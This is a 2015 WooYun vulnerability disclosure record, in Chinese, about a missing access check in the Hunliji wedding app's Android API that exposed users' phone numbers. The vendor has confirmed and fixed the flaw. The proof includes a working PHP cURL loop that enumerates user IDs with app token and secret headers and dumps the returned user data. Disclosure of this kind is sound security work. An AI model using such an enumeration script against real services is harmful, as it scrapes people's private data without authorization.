{"id": 28270, "wybug_id": "wooyun-2015-0111483", "wybug_title": "婚礼纪安卓APP数据非授权访问导致大量用户数据等资料泄露", "wybug_corp": "hunliji.com", "wybug_author": "rainrain", "wybug_date": "2015-05-04 14:31", "wybug_open_date": "2015-06-18 14:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向公众公开  简要描述： 安卓APP在获取已登录用户数据时采用的是GET请求,且未做权限控制,返回数据包含用户手机号 详细说明：  百科介绍:婚礼纪是一款用于婚礼筹备与记录的移动应用，由杭州火烧云科技有限公司推出。其专注婚礼行业垂直细分市场，帮助新人解决婚礼筹备与记录的难题。集婚礼工具（富媒体请柬）、婚礼行业商家展示、婚品导购、社区分享为一体的跨平台移动婚礼应用。   漏洞证明：  登录后点击底部菜单栏“我的”,通过抓包工具看到是通过GET请求获取当前用户信息的\n\n抓包:\n\n下面来构造个循环获取数据,\n\n插入数据库:\n\n\nPHP CURL:for($i=833500;$i<833566;$i++){\t$curl = curl_init('http://www.hunliji.com/users/'.$i.'.json');\t\t$header = array();\t\t$header[] = 'appver: 5.0.1';\t\t$header[] = 'phone: 37a1068a-f6b2-3f5f-9e43-c7a32904d638';\t\t$header[] = 'city: {\"expo_cid\":0,\"gps_latitude\":30.420344,\"community_cid\":0,\"gps_longitude\":114.320962}';\t\t$header[] = 'devicekind: android';\t\t$header[] = 'token: 469460297bb1e82fdedf56401b073c08';\t\t$header[] = 'secret: c27f1d2c5acf20994fa15a49f1ed165d';\t\t$header[] = 'Host: www.hunliji.com';\t\t$header[] = 'Connection: Keep-Alive';\t\t$header[] = 'User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)';\t\tcurl_setopt($curl, CURLOPT_HTTPHEADER, $header);        // 不输出header头信息        curl_setopt($curl, CURLOPT_HEADER, 0);        // 保存到字符串而不是输出        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);        $response = curl_exec($curl);        curl_close($curl);\t\t//echo($response);\t\t$rs=json_decode($response,true);\t\tprint_r($rs);}\n   修复方案：  授权控制,你懂的   版权声明：转载请注明来源 rainrain@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-05-04 14:48 厂商回复： 用户的事无小事，涉及到用户隐私，是比较严重的问题了。 最新状态： 2015-05-12：漏洞已经修复，非常感谢作者对我们信息安全的帮助  ", "replys": "漏洞评价：\n评论\n     2015-05-04 11:47 |    \t\t姗姗来迟 \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:72        | coffeesafe的小号)\t\t \n  看到少妇，我果断关注了。    \n     2015-05-04 12:21 |    \t\t马云 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 啪啪啪啪啪啪啪啪)\t\t \n  看到少妇，我果断关注了。    \n     2015-05-04 14:41 |    \t\t孤独行者 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:44        | 时光如水，总是无言。你若安好，便是晴天)\t\t \n  看到少妇，我果断关注了。    \n     2015-05-04 14:46 |    \t\t1937nick \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:32        | 水能载舟,亦能煮粥。物尽其用,人尽其能。)\t\t \n  看到少妇，我果断关注了。    \n     2015-05-04 15:01 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  看到少妇，我果断关注了。    \n     2015-05-04 15:03 |    \t\t浮世浮城 \t\t\t( 普通白帽子  |\t\t\t        Rank:284 漏洞数:60        | 我存于这俗世烟火的浮世，我爱这时光倒影的...)\t\t \n  看到少妇，我果断关注了。    \n     2015-05-04 15:34 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  本来是不关注的，看到少妇，我果断关注了。    \n     2015-05-04 15:48 |    \t\tChinalover \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 你看得到我打在屏幕上的字，却看不到我落在...)\t\t \n  楼上的你们够了，我只想说四个字！带我一个    \n     2015-05-04 16:39 |    \t\txiaogui \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:24        | 围观大牛来了~~~)\t\t \n  看到少妇，我果断关注了。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}